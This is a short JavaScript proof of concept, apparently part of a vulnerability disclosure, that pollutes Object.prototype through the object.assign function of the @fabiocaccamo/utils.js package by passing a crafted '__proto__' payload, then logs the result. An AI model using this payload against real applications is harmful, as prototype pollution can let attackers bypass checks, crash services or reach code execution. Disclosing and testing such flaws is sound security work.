const utils = require("@fabiocaccamo/utils.js");

const username = {};

console.log(`Before : ${username.pollution}`);
utils.object.assign(username, {'__proto__':{'pollution':true}});
console.log(`After : ${username.pollution}`);